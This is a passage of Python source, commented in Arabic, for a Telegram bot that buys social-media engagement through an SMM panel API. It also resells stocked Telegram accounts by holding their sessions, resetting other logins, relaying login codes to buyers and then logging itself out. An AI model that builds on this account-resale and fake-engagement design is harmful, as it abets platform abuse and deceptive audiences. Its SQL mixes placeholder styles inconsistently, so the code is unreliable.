            row = c.execute("SELECT * FROM users WHERE user_id=%s", (int(text),)).fetchone()
            if row:
                return dict(row)
        # وإلا ابحث بالـ username (غير حساس لحالة الأحرف)
        row = c.execute(
            "SELECT * FROM users WHERE LOWER(username)=LOWER(%s)", (text,)
        ).fetchone()
        return dict(row) if row else None

def add_points(user_id: int, pts: int):
    with db_conn() as c:
        c.execute("UPDATE users SET points=points+? WHERE user_id=?", (pts, user_id))

def deduct_points(user_id: int, pts: int) -> bool:
    """خصم نقاط بشكل ذري باستخدام UPDATE مشروط — آمن للاستخدام المتزامن"""
    with db_conn() as c:
        c.execute(
            "UPDATE users SET points=points-%s WHERE user_id=%s AND points>=%s",
            (pts, user_id, pts)
        )
        return c.rowcount > 0

def deduct_points_clamped(user_id: int, pts: int) -> int:
    """يخصم نقاطاً بحد أقصى لا يقل عن صفر (لا يجعل الرصيد سالباً)، ويُرجع العدد الفعلي المخصوم."""
    with db_conn() as c:
        row = c.execute("SELECT points FROM users WHERE user_id=?", (user_id,)).fetchone()
        if not row:
            return 0
        current = row["points"] or 0
        actual = min(pts, current)
        if actual > 0:
            c.execute("UPDATE users SET points=points-%s WHERE user_id=%s", (actual, user_id))
        return actual

def get_user(user_id: int) -> dict | None:
    with db_conn() as c:
        row = c.execute("SELECT * FROM users WHERE user_id=?", (user_id,)).fetchone()
        return dict(row) if row else None

def next_order_code(user_id: int) -> str:
    """يُنشئ كود طلب فريد باستخدام UPDATE RETURNING لضمان عدم التكرار"""
    with db_conn() as c:
        c.execute(
            "UPDATE users SET total_orders=total_orders+1 WHERE user_id=%s RETURNING bot_user_num, total_orders",
            (user_id,)
        )
        u = c.fetchone()
        c.execute(
            "UPDATE settings SET value=(value::int+1)::text WHERE key='total_bot_orders' RETURNING value::int AS total",
        )
        row = c.fetchone()
        total = row["total"] if row else 1
        return f"{u['total_orders']}-{u['bot_user_num']}-{total}"

# ────────────────────────────────────────────────────────────
#  واجهة SMMMAIN API
# ────────────────────────────────────────────────────────────
def smm_request(action: str, panel: int = 1, **params) -> dict:
    site = PANEL_MAP.get(int(panel), PANEL_MAP[1])
    payload = {"key": site["key"], "action": action, **params}
    try:
        r = requests.post(site["url"], data=payload, timeout=15)
        return r.json()
    except Exception as e:
        return {"error": str(e)}

# كاش لقائمة الخدمات (تُحدَّث كل ساعة) لتفادي استدعاء API مع كل طلب جزئي
_services_cache: dict = {}  # panel -> (timestamp, list)
_SERVICES_CACHE_TTL = 3600  # ثانية

def smm_service_info(service_id: int, panel: int = 1) -> dict:
    now = time.time()
    cached = _services_cache.get(panel)
    if cached and now - cached[0] < _SERVICES_CACHE_TTL:
        services = cached[1]
    else:
        raw = smm_request("services", panel=panel)
        # بعض المواقع تُرجع قائمة [{service:1,...}, ...]
        # وبعضها تُرجع قاموس {"1": {...}, "2": {...}}
        if isinstance(raw, list):
            services = raw
        elif isinstance(raw, dict) and "error" not in raw:
            # حوّل القاموس إلى قائمة وأضف مفتاح service إن لم يكن موجوداً
            services = []
            for k, v in raw.items():
                if isinstance(v, dict):
                    if "service" not in v:
                        v = dict(v, service=k)
                    services.append(v)
        else:
            site_name = PANEL_MAP.get(panel, PANEL_MAP[1])["name"]
            logger.warning(f"⚠️ smm_service_info: رد غير متوقع من {site_name} (panel={panel}): {str(raw)[:300]}")
            return {}
        _services_cache[panel] = (now, services)
    for s in services:
        if str(s.get("service")) == str(service_id):
            return s
    return {}

def smm_create_order(service_id: int, link: str, quantity: int, panel: int = 1) -> dict:
    return smm_request("add", panel=panel, service=service_id, link=link, quantity=quantity)

def smm_order_status(order_id: str, panel: int = 1) -> dict:
    return smm_request("status", panel=panel, order=order_id)


# رسالة موحّدة تُرسل مع أي فشل/إلغاء لطلب، لتوجيه المستخدم لسبب الخطأ الأكثر شيوعاً:
# إرسال رابط لا يطابق نوع الخدمة (مثال: رابط حساب بدل رابط منشور).
LINK_ERROR_GUIDANCE = (
    "⚠️ *السبب الأكثر شيوعاً لهذا الخطأ هو إرسال رابط غير مطابق لنوع الخدمة.*\n\n"
    "📌 يرجى التأكد من التالي قبل إعادة الطلب:\n"
    "• إذا كانت الخدمة *لايكات / تعليقات / مشاهدات* ➜ أرسل رابط *المنشور (البوست)* نفسه، لا رابط الحساب.\n"
    "• إذا كانت الخدمة *متابعين / أعضاء* ➜ أرسل رابط *الحساب أو القناة* فقط، لا رابط منشور.\n"
    "• تأكد أن الرابط من *نفس المنصة* المطلوبة تماماً (إنستغرام، تيك توك، ...).\n"
    "• تأكد أن الحساب أو المنشور *عام (Public)* وغير خاص.\n\n"
    "🔁 بعد التأكد من الرابط الصحيح، أعد إرسال طلبك."
)


def _calc_partial_refund_pts(api_service_id: int, remains: int) -> int:
    """يحسب النقاط المستردّة من الطلب الجزئي لموقع SMMMAIN:
    المعادلة: (سعر الخدمة بالدولار / 1000) × الوحدات المتبقية × 100,000
    أي: 1000 نقطة لكل سنت يُستردّ (100,000 نقطة لكل دولار)."""
    try:
        svc_info = smm_service_info(api_service_id, panel=1)
        rate = float(svc_info.get("rate", 0) or 0)   # USD per 1000 units
        if rate <= 0 or remains <= 0:
            return 0
        refunded_usd   = (rate / 1000) * remains
        refunded_cents = refunded_usd * 100
        return max(1, round(refunded_cents * 1000))   # 1000 نقطة لكل سنت
    except Exception as e:
        logger.warning(f"⚠️ فشل حساب استرجاع الطلب الجزئي: {e}")
        return 0


def _format_elapsed(added_at) -> str:
    """يعيد نصاً يوضّح المدة المنقضية منذ إضافة الرقم للبوت."""
    try:
        if added_at is None:
            return "غير معروف"
        if added_at.tzinfo is None:
            added_at = added_at.replace(tzinfo=timezone.utc)
        delta = datetime.now(timezone.utc) - added_at
        secs = int(delta.total_seconds())
        if secs < 60:
            return f"{secs} ثانية"
        mins = secs // 60
        if mins < 60:
            return f"{mins} دقيقة"
        hours = mins // 60
        if hours < 24:
            return f"{hours} ساعة"
        days = hours // 24
        return f"{days} يوم"
    except Exception:
        return "غير معروف"


_ARABIC_WEEKDAYS = ["الإثنين", "الثلاثاء", "الأربعاء", "الخميس", "الجمعة", "السبت", "الأحد"]


def format_account_datetime(dt) -> str:
    """يهيّئ تاريخاً/وقتاً بالصيغة المطلوبة: 2028/8/8 الأربعاء 19:55"""
    try:
        if dt is None:
            return "غير معروف"
        if dt.tzinfo is None:
            dt = dt.replace(tzinfo=timezone.utc)
        weekday_ar = _ARABIC_WEEKDAYS[dt.weekday()]
        return f"{dt.year}/{dt.month}/{dt.day} {weekday_ar} {dt.strftime('%H:%M')}"
    except Exception:
        return "غير معروف"


_ARABIC_MONTHS = {
    1: "يناير", 2: "فبراير", 3: "مارس", 4: "أبريل", 5: "مايو", 6: "يونيو",
    7: "يوليو", 8: "أغسطس", 9: "سبتمبر", 10: "أكتوبر", 11: "نوفمبر", 12: "ديسمبر",
}


def translate_official_notice(text: str) -> str:
    """يترجم أشهر أنماط رسائل تيليجرام الرسمية الأمنية (من 777000) إلى العربية.
    تيليجرام يرسل هذه الرسائل بصيغ إنجليزية ثابتة معدودة؛ نطابقها بأنماط (regex)
    ونستخرج منها الحقول (التاريخ/الوقت/الجهاز/الموقع) ثم نعيد صياغتها عربياً.
    إن لم يُطابَق أي نمط معروف، تُعاد النسخة الأصلية كما هي بدلاً من كسر الرسالة."""
    if not text:
        return text
    original = text
    low = text.lower()

    def _fmt_date(y, mo, d):
        try:
            return f"{int(d)} {_ARABIC_MONTHS.get(int(mo), mo)} {y}"
        except Exception:
            return f"{d}/{mo}/{y}"

    # ─── نمط: "Two-Step Verification settings changed. ... changed on DD/MM/YYYY at HH:MM:SS UTC. Device: ... Location: ..."
    if "two-step verification" in low and "changed" in low:
        m_date = re.search(r"changed on\s+(\d{1,2})/(\d{1,2})/(\d{4})\s+at\s+([\d:]+)\s*(UTC)?", text, re.IGNORECASE)
        m_device = re.search(r"Device:\s*(.+?)(?:\n|$)", text)
        m_loc = re.search(r"Location:\s*(.+?)(?:\n|$)", text)
        parts = ["🔐 *تغيّرت إعدادات التحقق بخطوتين*", "تم تغيير كلمة مرور التحقق بخطوتين و/أو البريد الاحتياطي لهذا الحساب."]
        if m_date:
            day, mon, year, time_str = m_date.group(1), m_date.group(2), m_date.group(3), m_date.group(4)
            parts.append(f"🗓 الوقت: {_fmt_date(year, mon, day)} — {time_str} (توقيت UTC)")
        if m_device:
            parts.append(f"📱 الجهاز: {m_device.group(1).strip()}")
        if m_loc:
            parts.append(f"📍 الموقع: {m_loc.group(1).strip()}")
        parts.append("⚠️ إن لم يكن هذا التغيير معروفاً لك، راجع الجلسات النشطة فوراً.")
        return "\n".join(parts)

    # ─── نمط: "New login. We noticed a login into your account from a new device on ... Device: ... Location: ..."
    if ("new login" in low or "login from a new device" in low) and "device:" in low:
        m_device = re.search(r"Device:\s*(.+?)(?:\n|$)", text)
        m_loc = re.search(r"Location:\s*(.+?)(?:\n|$)", text)
        parts = ["🆕 *تسجيل دخول جديد على هذا الحساب*"]
        if m_device:
            parts.append(f"📱 الجهاز: {m_device.group(1).strip()}")
        if m_loc:
            parts.append(f"📍 الموقع: {m_loc.group(1).strip()}")
        parts.append("⚠️ إن لم يكن هذا تسجيل دخولك، راجع الجلسات النشطة فوراً.")
        return "\n".join(parts)

    # ─── نمط: رسالة كود تسجيل الدخول العادية ───
    if "login code" in low or "this code can be used to log" in low:
        m_code = re.search(r"\b(\d{4,7})\b", text)
        if m_code:
            return f"🔑 *كود تسجيل دخول*\n\nالكود: `{m_code.group(1)}`\n⚠️ لا تُعطِ هذا الكود لأي شخص، حتى لو زعم أنه من تيليجرام."

    # ─── نمط: تعطيل/تسجيل خروج الحساب ───
    if "account was" in low and ("deactivat" in low or "terminated" in low or "logged out" in low):
        return f"🔴 *تم تسجيل الخروج/تعطيل هذا الحساب من تيليجرام.*\n\n(النص الأصلي: {original})"

    # ─── لم يُطابَق أي نمط معروف: نُعيد النص الأصلي مع توضيح أنه لم تتم ترجمته تلقائياً ───
    return f"{original}\n\n(⚠️ لم تُترجم هذه الرسالة تلقائياً — نمط غير معروف)"


async def _kick_then_notify(bot, phone: str, stock_id: int, added_at, session_str: str):
    """يطرد كل الجلسات الإضافية فوراً ثم يُرسل إشعاراً للمالك مع أزرار الإدارة."""
    # ① طرد فوري
    kicked = False
    try:
        _kick_cl = TelegramClient(StringSession(session_str), int(TELEGRAM_API_ID), TELEGRAM_API_HASH)
        await _kick_cl.connect()
        if await _kick_cl.is_user_authorized():
            await _kick_cl(ResetAuthorizationsRequest())
            kicked = True
            logger.info(f"🔐 _kick_then_notify: طُردت الجلسات الإضافية للرقم {phone}")
        await _kick_cl.disconnect()
    except Exception as _e:
        logger.warning(f"⚠️ _kick_then_notify: فشل طرد {phone}: {_e}")

    # ② إشعار المالك مع الأزرار
    await notify_new_login(bot, phone, added_at=added_at, stock_id=stock_id, kicked=kicked)


async def notify_account_change(bot, phone: str, change_desc: str, added_at=None, stock_id: int | None = None):
    """يُرسل إشعاراً موحّد الشكل عن أي تغيّر في حساب (طرد/تجميد/تغيّر أجهزة/تنبيه أمني...)
    إلى NUMBERS_GROUP_ID إن كان مضبوطاً، وإلا إلى OWNER_ID."""
    target = NUMBERS_GROUP_ID or OWNER_ID
    if not target:
        return
    assigned_to = None
    ever_sold   = False
    if stock_id is not None:
        try:
            with db_conn() as c:
                row = c.execute(
                    "SELECT added_at, assigned_to, ever_sold FROM number_stock WHERE id=%s", (stock_id,)
                ).fetchone()
                if row:
                    if added_at is None:
                        added_at = row["added_at"]
                    assigned_to = row["assigned_to"]
                    ever_sold   = bool(row["ever_sold"])
        except Exception:
            pass
    elif added_at is None:
        try:
            with db_conn() as c:
                row = c.execute(
                    "SELECT added_at, assigned_to, ever_sold FROM number_stock WHERE phone_number=%s", (phone,)
                ).fetchone()
                if row:
                    added_at    = row["added_at"]
                    assigned_to = row["assigned_to"]
                    ever_sold   = bool(row["ever_sold"])
        except Exception:
            pass
    if assigned_to:
        sale_status = f"✅ *مباع* (المشتري: `{assigned_to}`)"
    elif ever_sold:
        sale_status = "🛒 *مباع سابقاً* — المشتري أنهى الجلسة أو غادر بإرادته"
    else:
        sale_status = "❌ *غير مباع* — قد يكون اختراقاً!"
    text = (
        f"🔔 *تنبيه تغيّر في حساب*\n\n"
        f"التغيّر: {change_desc}\n"
        f"رقم الحساب: `{phone}`\n"
        f"الدولة: {guess_country(phone)}\n"
        f"وقت ادخال الحساب: {format_account_datetime(added_at)}\n"
        f"حالة الحساب: {sale_status}"
    )
    try:
        await bot.send_message(target, text, parse_mode=ParseMode.MARKDOWN)
    except Exception as e:
        logger.error(f"❌ فشل إرسال تنبيه تغيّر الحساب {phone}: {e}")


async def notify_new_login(bot, phone: str, added_at=None, stock_id: int | None = None, kicked: bool = True):
    """يُرسل تنبيه دخول جديد مع أزرار الإدارة إلى NUMBERS_GROUP_ID أو OWNER_ID."""
    target = NUMBERS_GROUP_ID or OWNER_ID
    if not target:
        return
    kick_line = "✅ تم طرد الجلسة فوراً." if kicked else "⚠️ تعذّر الطرد التلقائي."
    text = (
        f"🚨 *دخول جديد على حساب غير مباع!*\n\n"
        f"📱 رقم الحساب: `{phone}`\n"
        f"🌍 الدولة: {guess_country(phone)}\n\n"
        f"{kick_line}\n\n"
        f"اضغط *سماح 5 دقائق* إذا أردت أن يتمكن شخص من الدخول مرة واحدة (الأول يدخل، الثاني يُطرد).\n"
        f"بعد انتهاء النافذة أو استخدامها يعود الطرد الفوري."
    )
    kb = InlineKeyboardMarkup([
        [
            InlineKeyboardButton("✅ سماح 5 دقائق", callback_data=f"os:allow_5min:{phone}"),
            InlineKeyboardButton("📋 معلومات", callback_data=f"os:account_info:{phone}"),
        ],
        [
            InlineKeyboardButton("🚪 مغادرة البوت", callback_data=f"os:leave_account:{phone}"),
        ]
    ])
    try:
        await bot.send_message(target, text, parse_mode=ParseMode.MARKDOWN, reply_markup=kb)
    except Exception as e:
        logger.error(f"❌ فشل إرسال تنبيه دخول جديد {phone}: {e}")


async def request_manual_2fa_password(bot, phone: str, stock_id: int):
    """يُرسل طلباً (مع زر) لإدخال كلمة مرور التحقق بخطوتين إلى NUMBERS_GROUP_ID أو OWNER_ID."""
    target = NUMBERS_GROUP_ID or OWNER_ID
    if not target:
        return
    try:
        await bot.send_message(
            target,
            f"🔑 *طلب كلمة مرور التحقق بخطوتين الصحيحة*\n\n"
            f"رقم الحساب: `{phone}`\n"
            f"الدولة: {guess_country(phone)}\n\n"
            f"الكلمة الثابتة المعتمدة \"{OWNER_FIXED_2FA_PASSWORD}\" غير صحيحة على هذا الحساب. "
            f"اضغط الزر أدناه وأرسل كلمة المرور الصحيحة الفعلية لهذا الرقم.",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("📤 إرسال كلمة المرور الصحيحة الآن", callback_data=f"os:set_2fa_manual:{stock_id}")
            ]])
        )
    except Exception as e:
        logger.error(f"❌ فشل إرسال طلب كلمة مرور 2FA اليدوية للرقم {phone}: {e}")


async def monitor_number_changes_job(context: ContextTypes.DEFAULT_TYPE):
    """مهمة دورية: تفحص كل رقم بالمخزون له جلسة، وتقارن حالته الحالية (تجميد/تصريح/عدد الأجهزة)
    بآخر حالة معروفة محفوظة بقاعدة البيانات. أي اختلاف عن آخر مرة يُبلَّغ للمالك فوراً
    بالصيغة الموحّدة (التغيّر/رقم الحساب/الدولة/وقت الإدخال)، ثم تُحفظ الحالة الجديدة كمرجع للمقارنة القادمة.
    لا تُرسل أي رسائل فعلية لأي بوت خارجي (مثل SpamBot) لتجنّب أي نشاط آلي مكثّف قد يرفع خطر الحظر."""
    if not (TELEGRAM_API_ID and TELEGRAM_API_HASH):
        return
    with db_conn() as c:
        rows = c.execute(
            "SELECT id, phone_number, session_string, added_at, last_frozen, last_authorized, last_device_count "
            "FROM number_stock WHERE session_string IS NOT NULL AND deleted_at IS NULL"
        ).fetchall()
    for row in rows:
        rec = dict(row)
        client = TelegramClient(StringSession(rec["session_string"]), int(TELEGRAM_API_ID), TELEGRAM_API_HASH)
        try:
            await client.connect()
            authorized = await client.is_user_authorized()
            is_frozen, _, _ = (False, None, None)
            devices = -1
            if authorized:
                is_frozen, _, _ = await check_account_frozen(client, rec["id"])
                devices = await get_device_count(client)

            changes = []
            last_authorized = rec["last_authorized"] if rec["last_authorized"] is not None else True
            last_frozen = bool(rec["last_frozen"])
            last_devices = rec["last_device_count"] if rec["last_device_count"] is not None else -1

            just_kicked = False
            if last_authorized and not authorized:
                changes.append("تم طرد الحساب (تسجيل خروج/انتهاء الجلسة من تيليجرام)")
                just_kicked = True
            elif not last_authorized and authorized:
                changes.append("عاد الحساب مصرَّحاً (تسجيل الدخول سليم من جديد)")

            if authorized:
                if is_frozen and not last_frozen:
                    changes.append("تم تجميد الحساب 🔴")
                elif last_frozen and not is_frozen:
                    changes.append("تم رفع التجميد عن الحساب (نشط الآن)")
                if devices >= 0 and last_devices >= 0 and devices != last_devices:
                    changes.append(f"تغيّر عدد الأجهزة المسجّلة من {last_devices} إلى {devices}")

            # ─── منطق الجهاز الثاني ───────────────────────────────────────────────
            if authorized and devices > 0:
                owner_logging = any(
                    p.get("phone") == rec["phone_number"]
                    for p in _pending_number_logins.values()
                )
                with db_conn() as _ca:
                    _ass = _ca.execute(
                        "SELECT assigned_to, ever_sold FROM number_stock WHERE id=%s", (rec["id"],)
                    ).fetchone()
                    is_assigned  = bool(_ass and _ass["assigned_to"])
                    is_ever_sold = bool(_ass and _ass["ever_sold"])

                is_sold = is_assigned or is_ever_sold
                # هل ارتفع عدد الأجهزة منذ آخر فحص؟ (يعني دخول جديد حدث الآن)
                device_count_rose = (
                    last_devices >= 1 and devices > last_devices
                )

                if not owner_logging:
                    if is_sold and device_count_rose:
                        # ✅ حساب مباع + ارتفع عدد الأجهزة = المشتري دخل الآن
                        # ننتظر 10 ثوانٍ ثم نغادر
                        buyer_id_exit = _ass["assigned_to"] if _ass else None
                        phone_exit    = rec["phone_number"]
                        stock_id_exit = rec["id"]
                        logger.info(
                            f"🚪 bot_exit_sold_account: {phone_exit} — "
                            f"أجهزة ارتفعت {last_devices}→{devices}، انتظار 10 ث ثم مغادرة."
                        )

                        async def _delayed_exit(phone_e, stock_id_e, buyer_e):
                            await asyncio.sleep(0)
                            # احصل على الجلسة قبل إيقاف المراقبة
                            _sess_del = None
                            try:
                                with db_conn() as _dsx:
                                    _sr_del = _dsx.execute(
                                        "SELECT session_string FROM number_stock WHERE phone_number=%s", (phone_e,)
                                    ).fetchone()
                                    if _sr_del:
                                        _sess_del = _sr_del["session_string"]
                            except Exception:
                                pass
                            try:
                                await _stop_number_monitor(phone_e)
                            except Exception:
                                pass
                            # ─── طرد الجلسة الدائمة (إن وُجدت) قبل مغادرة البوت ───
                            # نحتفظ بجلسة المشتري (الأحدث) ونطرد الشخص المسموح له سابقاً.
                            if _sess_del and TELEGRAM_API_ID and TELEGRAM_API_HASH and phone_e in _permanently_allowed_phones:
                                try:
                                    _kick_cli = TelegramClient(
                                        StringSession(_sess_del),
                                        int(TELEGRAM_API_ID), TELEGRAM_API_HASH
                                    )
                                    await asyncio.wait_for(_kick_cli.connect(), timeout=10)
                                    _auths = await asyncio.wait_for(
                                        _kick_cli(GetAuthorizationsRequest()), timeout=10
                                    )
                                    # نرتّب الجلسات الأخرى (غير الحالية) من الأقدم للأحدث
                                    _others = sorted(
                                        [a for a in _auths.authorizations if not a.current],
                                        key=lambda a: a.date_created
                                    )
                                    # نطرد كل شيء ما عدا الأحدث (المشتري)
                                    for _a in _others[:-1]:  # نتجاوز الأحدث (المشتري)
                                        try:
                                            await asyncio.wait_for(
                                                _kick_cli(ResetAuthorizationRequest(hash=_a.hash)),
                                                timeout=8
                                            )
                                        except Exception:
                                            pass
                                    try:
                                        await _kick_cli.disconnect()
                                    except Exception:
                                        pass
                                    _permanently_allowed_phones.discard(phone_e)
                                    logger.info(f"✅ delayed_exit: طُرد الشخص الدائم من {phone_e} — المشتري يبقى وحده")
                                except Exception as _pe:
                                    logger.warning(f"⚠️ delayed_exit: فشل طرد الشخص الدائم من {phone_e}: {_pe}")
                            _permanently_allowed_phones.discard(phone_e)
                            # ─── تسجيل خروج البوت فعلياً — المشتري يبقى الوحيد ───
                            if _sess_del and TELEGRAM_API_ID and TELEGRAM_API_HASH:
                                try:
                                    _lo_del = TelegramClient(
                                        StringSession(_sess_del),
                                        int(TELEGRAM_API_ID), TELEGRAM_API_HASH
                                    )
                                    await asyncio.wait_for(_lo_del.connect(), timeout=10)
                                    await asyncio.wait_for(_lo_del.log_out(), timeout=10)
                                except Exception:
                                    pass
                            with db_conn() as _cx:
                                _cx.execute(
                                    "UPDATE number_stock SET assigned_to=NULL, assigned_at=NULL WHERE id=%s",
                                    (stock_id_e,)
                                )
                            _buyer_received_codes.pop(buyer_e, None)
                            if buyer_e:
                                try:
                                    await context.bot.send_message(
                                        buyer_e,
                                        "✅ *دخلت للحساب بنجاح!*\n\n"
                                        "البوت غادر الحساب تلقائياً. الحساب أصبح بيدك كاملاً 🤍",
                                        parse_mode="Markdown"
                                    )
                                except Exception:
                                    pass
                            _ng = NUMBERS_GROUP_ID or OWNER_ID
                            if _ng:
                                try:
                                    await context.bot.send_message(
                                        _ng,
                                        f"🚪 <b>خروج تلقائي — دخل المشتري</b>\n\n"
                                        f"📱 <code>{phone_e}</code>\n"
                                        f"📲 الأجهزة: {last_devices} → {devices}\n"
                                        f"✅ البوت غادر وأنهى علاقته بالحساب 100%.",
                                        parse_mode="HTML"
                                    )
                                except Exception:
                                    pass

                        asyncio.create_task(_delayed_exit(phone_exit, stock_id_exit, buyer_id_exit))
                        # نكمل تحديث DB بعدد الأجهزة (السجل الرئيسي يُحدَّث أدناه كالمعتاد)

                    elif not is_sold and devices > 1:
                        # حساب غير مباع + يوجد جلسة خارجية
                        _phone_key = rec["phone_number"]
                        _now = time.time()
                        _win = _allow_5min_phones.get(_phone_key)

                        if _phone_key in _permanently_allowed_phones:
                            # جلسة مسموح لها بالبقاء للأبد — لا نطرد أبداً
                            logger.debug(f"✅ monitor: جلسة دائمة مسموح بها للرقم {_phone_key} — لا طرد")

                        elif _win and _win["until"] > _now and not _win["used"]:
                            # نافذة مفتوحة وأول دخول → نسمح ونُسجّل كمسموح دائم
                            _allow_5min_phones.pop(_phone_key, None)
                            _permanently_allowed_phones.add(_phone_key)
                            logger.info(f"✅ monitor: دخول مسموح (نافذة 5 دق) للرقم {_phone_key} — يبقى للأبد")
                            changes.append("✅ دخول مسموح به — الجلسة تبقى للأبد، النافذة أُغلقت")

                        else:
                            # دخيل — نطرد فوراً
                            try:
                                await client(ResetAuthorizationsRequest())
                                logger.info(f"🔒 monitor: طُردت الجلسات الدخيلة للرقم {_phone_key} عبر عميل المراقبة")
                                asyncio.create_task(notify_new_login(
                                    context.bot, _phone_key,
                                    added_at=rec["added_at"], stock_id=rec["id"], kicked=True
                                ))
                                changes.append("🚨 جلسة دخيلة — طُردت فوراً عبر عميل المراقبة")
                            except Exception as _mk:
                                logger.warning(f"⚠️ monitor kick فشل للرقم {_phone_key}: {_mk}")
                                asyncio.create_task(_kick_then_notify(
                                    context.bot, _phone_key, rec["id"], rec["added_at"],
                                    rec["session_string"]
                                ))
                                changes.append("🚨 جلسة دخيلة — جارٍ الطرد...")

            if changes:
                await notify_account_change(
                    context.bot, rec["phone_number"], "، ".join(changes),
                    added_at=rec["added_at"], stock_id=rec["id"]
                )

            # ─── حساب is_solo: البوت الجلسة الوحيدة؟ ────────────────────────
            new_is_solo = authorized and (devices == 1) if devices >= 0 else False
            prev_is_solo = False
            with db_conn() as _pcheck:
                _prow = _pcheck.execute(
                    "SELECT is_solo, can_send_code, ever_sold FROM number_stock WHERE id=%s", (rec["id"],)
                ).fetchone()
                if _prow:
                    prev_is_solo  = bool(_prow["is_solo"])
            with db_conn() as c2:
                if just_kicked:
                    # عند الطرد/الخروج: نُعلَّم sessions_reset=TRUE حتى يظهر الرقم في الفلتر
                    c2.execute(
                        "UPDATE number_stock SET last_authorized=%s, last_frozen=%s, last_device_count=%s, "
                        "is_solo=%s, kicked_at=NOW(), sessions_reset=TRUE WHERE id=%s",
                        (authorized, is_frozen if authorized else last_frozen,
                         devices if devices >= 0 else last_devices, new_is_solo, rec["id"])
                    )
                else:
                    c2.execute(
                        "UPDATE number_stock SET last_authorized=%s, last_frozen=%s, last_device_count=%s, "
                        "is_solo=%s WHERE id=%s",
                        (authorized, is_frozen if authorized else last_frozen,
                         devices if devices >= 0 else last_devices, new_is_solo, rec["id"])
                    )
            # ─── إذا أصبح البوت للتو الجلسة الوحيدة → اختبر can_send_code ─
            if new_is_solo and not prev_is_solo and _prow and not _prow["ever_sold"] and not _prow["can_send_code"]:
                asyncio.create_task(
                    _test_and_set_can_send_code(rec["phone_number"], rec["session_string"], rec["id"])
                )
        except Exception as e:
            logger.debug(f"⏳ تعذّر فحص تغيّرات الرقم {rec['phone_number']} بهذه الدورة: {e}")
        finally:
            try:
                await client.disconnect()
            except Exception:
                pass
        await asyncio.sleep(2)  # تباعد بين كل حساب والآخر لتجنّب أي نشاط مكثّف من نفس السيرفر


async def _stop_number_monitor(phone: str):
    """يوقف مراقبة رقم معيّن نهائياً (يُستخدم عند حذف الرقم نهائياً من سلة المهملات)."""
    client = _monitor_clients.pop(phone, None)
    task = _monitor_tasks.pop(phone, None)
    if client is not None:
        try:
            await client.disconnect()
        except Exception:
            pass
    if task is not None:
        try:
            task.cancel()
        except Exception:
            pass


async def _start_number_monitor(phone: str, session_str: str, application):
    """يفتح اتصالاً دائماً بحساب هذا الرقم ليراقب أي تنبيهات أمنية تصله من تيليجرام الرسمي
    (جلسة دخول جديدة، تغيير كلمة المرور، إضافة/تغيير بريد الاسترجاع، ...) ويبلّغ المالك فوراً.

    ⚠️ السبب الجذري لعدم وصول الإشعارات سابقاً: كان الكلايانت يتصل فقط بدون تشغيل
    حلقة استقبال التحديثات. Telethon لا يُطلق أحداث NewMessage إلا إذا كانت هناك مهمة
    run_until_disconnected() تعمل بالخلفية. الإصلاح: asyncio.create_task.
    """
    if not (TELEGRAM_API_ID and TELEGRAM_API_HASH):
        return
    if phone in _monitor_clients:
        return

    client = TelegramClient(
        StringSession(session_str),
        int(TELEGRAM_API_ID),
        TELEGRAM_API_HASH,
    )

    async def _on_official_message(event):
        try:
            text = (event.raw_text or "").strip()
            if not text:
                return

            # ─── جلب حالة الرقم من DB (مشترٍ + id المخزون) ───
            buyer_id = None
            stock_id = None
            try:
                with db_conn() as c:
                    row = c.execute(
                        "SELECT id, assigned_to FROM number_stock WHERE phone_number=%s", (phone,)
                    ).fetchone()
                    if row:
                        buyer_id = row["assigned_to"]
                        stock_id = row["id"]
            except Exception:
                pass

            is_new_login_msg = (
                "new login" in text.lower() or
                "login from a new device" in text.lower() or
                ("we noticed" in text.lower() and "device" in text.lower())
            )

            # ─── إذا وصلت رسالة "تسجيل دخول جديد" → نحدد هل هي مصرّح بها أم لا ───
            if is_new_login_msg:
                # الحالة 1: المالك يسجّل دخولاً عبر واجهة البوت (pending login flow)
                owner_is_logging_in = any(
                    p.get("phone") == phone
                    for p in _pending_number_logins.values()
                )
                # الحالة 2: الرقم مُباع ومشترٍ موجود (المشتري يستخدم الحساب)
                buyer_owns_it = bool(buyer_id)

                if buyer_owns_it and not owner_is_logging_in:
                    # المشتري دخل الحساب بالكامل → ننتظر 10 ثوانٍ ثم نغادر
                    _bid_snap   = buyer_id
                    _phone_snap = phone
                    _app_snap   = application

                    async def _exit_after_delay():
                        await asyncio.sleep(0)
                        # ─── أوقف المراقبة واحصل على الجلسة قبل إيقافها ───
                        _sess_for_logout = None
                        try:
                            with db_conn() as _dcs:
                                _srow = _dcs.execute(
                                    "SELECT session_string FROM number_stock WHERE phone_number=%s", (_phone_snap,)
                                ).fetchone()
                                if _srow:
                                    _sess_for_logout = _srow["session_string"]
                        except Exception:
                            pass
                        try:
                            await _stop_number_monitor(_phone_snap)
                        except Exception:
                            pass
                        # ─── تسجيل خروج البوت فقط — المشتري يبقى الوحيد في الحساب ───
                        # ⚠️ لا نستدعي ResetAuthorizationsRequest هنا لأن المشتري تسجّل
                        # دخوله للتو وإذا أعدنا التهيئة سنطرده نحن أيضاً!
                        if _sess_for_logout and TELEGRAM_API_ID and TELEGRAM_API_HASH:
                            try:
                                _lo = TelegramClient(
                                    StringSession(_sess_for_logout),
                                    int(TELEGRAM_API_ID), TELEGRAM_API_HASH
                                )
                                await asyncio.wait_for(_lo.connect(), timeout=10)
                                # نخرج البوت فقط — يبقى المشتري هو الجلسة الوحيدة
                                await asyncio.wait_for(_lo.log_out(), timeout=10)
                            except Exception:
                                pass
                        try:
                            with db_conn() as _clv:
                                _clv.execute(
                                    "UPDATE number_stock SET assigned_to=NULL, assigned_at=NULL, force_listed=FALSE "
                                    "WHERE phone_number=%s",
                                    (_phone_snap,)
                                )
                            _buyer_received_codes.pop(_bid_snap, None)
                            await _app_snap.bot.send_message(
                                _bid_snap,
                                "✅ *دخلت للحساب بنجاح!*\n\n"
                                "البوت غادر الحساب تلقائياً. الحساب أصبح بيدك كاملاً 🤍",
                                parse_mode="Markdown"
                            )
                            # (إشعار المالك عن خروج المشتري أُلغي بناءً على طلب المالك)
                        except Exception as _le:
                            logger.warning(f"⚠️ تعذّر المغادرة التلقائية للرقم {_phone_snap}: {_le}")

                    asyncio.create_task(_exit_after_delay())
                    return

                # جلب ever_sold للتمييز بين اختراق حقيقي ومشتري سابق يستخدم حسابه
                _ever_sold = False
                try:
                    with db_conn() as _ces:
                        _es_row = _ces.execute(
                            "SELECT ever_sold FROM number_stock WHERE phone_number=%s", (phone,)
                        ).fetchone()
